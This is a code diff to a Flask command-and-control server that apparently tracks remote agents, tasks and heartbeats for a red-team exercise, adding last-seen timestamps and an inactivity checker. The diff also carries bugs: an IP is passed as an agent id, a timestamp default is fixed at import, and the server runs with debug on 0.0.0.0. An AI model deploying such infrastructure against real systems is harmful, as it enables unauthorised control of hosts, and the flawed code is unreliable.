@@ -1,6 +1,9 @@
 from flask import Flask, request, jsonify, abort
 from flask_sqlalchemy import SQLAlchemy
 import requests
+from datetime import datetime, timezone
+import time
+import threading
 
 app = Flask(__name__)
 
@@ -15,6 +18,7 @@ class Agent(db.Model):
     agent_id = db.Column(db.String(100), unique=True, nullable=False)
     status = db.Column(db.String(20), default='active')
     targeted = db.Column(db.Boolean,default=False)
+    last_seen = db.Column(db.DateTime, default=datetime.now(tz=timezone.utc))
 
 class Task(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -47,6 +51,23 @@ def update_pwnboard(ip):
     except:
         pass
 
+def update_timestamp(agent_id):
+    agent = Agent.query.filter_by(agent_id=agent_id).first()
+    agent.last_seen = datetime.now(tz=timezone.utc)
+    db.session.commit()
+
+def check_agent_status():
+    while True:
+        timeout = 300  # 5 minutes
+        now = datetime.now(tz=timezone.utc)
+        agents = Agent.query.all()
+        for agent in agents:
+            if (now - agent.last_seen).total_seconds() > timeout:
+                agent.status = 'inactive'
+        db.session.commit()
+        time.sleep(180)
+
+
 #ROUTES:
 
 @app.route('/register', methods=['POST'])
@@ -62,6 +83,7 @@ def register_agent():
             return jsonify({"message": "Agent registered successfully"}), 201
         else:
             agent.status = 'active'
+            update_timestamp(agent_id)
             db.session.commit()
             return jsonify({"message": "Agent registration renewed"}), 200
     return jsonify({"error": "Invalid data"}), 400
@@ -79,6 +101,7 @@ def submit_results():
     try:
         print(request.json)
         data = request.json
+        agent_id = data['agent_id']
         task_id = data['task_id']
         result = data['result']
         task = Task.query.get(task_id)
@@ -87,6 +110,7 @@ def submit_results():
         if task.result != "NULL":
             task.result = result
         db.session.commit()
+        update_timestamp(agent_id)
         return jsonify({'status': 'success'})
     except:
         pass
@@ -98,6 +122,7 @@ def heartbeat():
         ip = data['ip']
         print(f"Received heartbeat from {ip}")
         update_pwnboard(ip)
+        update_timestamp(ip)
         return jsonify({'status': 'success'})
     except:
         pass
@@ -180,6 +205,8 @@ def homepage():
 
 
 def main():
+    agent_checker = threading.Thread(target=check_agent_status,daemon=True)
+    agent_checker.start()
     app.run(debug=True,host='0.0.0.0',port=80)
 
 
